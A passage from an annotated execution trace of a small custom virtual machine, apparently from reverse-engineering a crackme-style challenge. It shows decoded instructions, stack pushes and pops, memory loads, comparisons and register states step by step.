arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">b</span><span class="hljs-comment">// [0x3a,0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xad f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x8<br><span class="hljs-selector-attr">[s]</span> STK NONE c<br><span class="hljs-selector-attr">[s]</span> ... pushing c<span class="hljs-comment">// [0x20,0x3a,0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xae f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK c NONE<br><span class="hljs-selector-attr">[s]</span> ... popping c<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xaf f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">b</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb0 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">a</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">a</span><span class="hljs-comment">// [0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb1 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span>x7d<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">i</span> = <span class="hljs-number">0</span>x7d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x7e f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x30<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">a</span> = <span class="hljs-number">0</span>x30<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x30 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x7f f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x9e<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">b</span> = <span class="hljs-number">0</span>x9e<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x30 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x9e c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x80 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x30 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x9e c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x81 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x30 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x9e c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x82 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x10 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x20<br><span class="hljs-selector-attr">[s]</span> ADD d <span class="hljs-selector-tag">i</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x30 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x9e c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>x84 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x83 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<span class="hljs-comment">// [0x84,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x30 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x9e c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>x84 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x84 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span>xce<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">i</span> = <span class="hljs-number">0</span>xce<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x30 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x9e c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>x84 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xcf f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x10 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x8<br><span class="hljs-selector-attr">[s]</span> ADD <span class="hljs-selector-tag">a</span> c<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3c <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x9e c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>x84 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd0 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x10 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x8<br><span class="hljs-selector-attr">[s]</span> ADD <span class="hljs-selector-tag">b</span> c<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3c <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xaa c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>x84 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd1 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xff<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xff<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3c <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xaa c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd2 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x10 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> ADD <span class="hljs-selector-tag">a</span> d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xaa c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd3 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x10 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> ADD <span class="hljs-selector-tag">b</span> d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd4 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x4<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">a</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">a</span><span class="hljs-comment">// [0x3b,0x84,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd5 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">b</span><span class="hljs-comment">// [0xa9,0x3b,0x84,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd6 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x2 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x4<br><span class="hljs-selector-attr">[s]</span> LDM <span class="hljs-selector-tag">a</span> = *<span class="hljs-selector-tag">a</span><span class="hljs-comment">// a = a1[0x3b] = 0</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd7 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x2 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> LDM <span class="hljs-selector-tag">b</span> = *<span class="hljs-selector-tag">b</span><span class="hljs-comment">// b = a1[0xa9] = 0x6b</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6b c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd8 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x80 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> CMP <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6b c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd9 f:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">b</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xda f:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">a</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">a</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xdb f:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xe2<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xe2<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xe2 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xdc f:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x40 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[j]</span> JMP N d<br><span class="hljs-selector-attr">[j]</span> ... TAKEN<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xe2 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xe3 f:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x8<br><span class="hljs-selector-attr">[s]</span> STK d c<br><span class="hljs-selector-attr">[s]</span> ... pushing c<br><span class="hljs-selector-attr">[s]</span> ... popping d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xc s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xe4 f:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">i</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">i</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xc s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x85 f:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>xc s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x86 f:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x80 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x8<br><span class="hljs-selector-attr">[s]</span> CMP d c<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>xc s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x87 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x88 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x40 arg1:<span class="hljs-number">0</span>x10 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[j]</span> JMP E d<br><span class="hljs-selector-attr">[j]</span> ... NOT TAKEN<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x89 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xb1<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xb1<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>xb1 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x8a f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x40 arg1:<span class="hljs-number">0</span>xa arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[j]</span> JMP LG d<br><span class="hljs-selector-attr">[j]</span> ... TAKEN<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>xb1 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb2 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">b</span> = <span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x1 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>xb1 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb3 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x10 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x40<br><span class="hljs-selector-attr">[s]</span> ADD <span class="hljs-selector-tag">b</span> s<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>xb1 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb4 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x49<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x49<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x49 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb5 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x49 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb6 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x4e<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x4e<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x4e s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb7 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x4e s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb8 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x43<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x43<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x43 s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb9 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x43 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xba f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 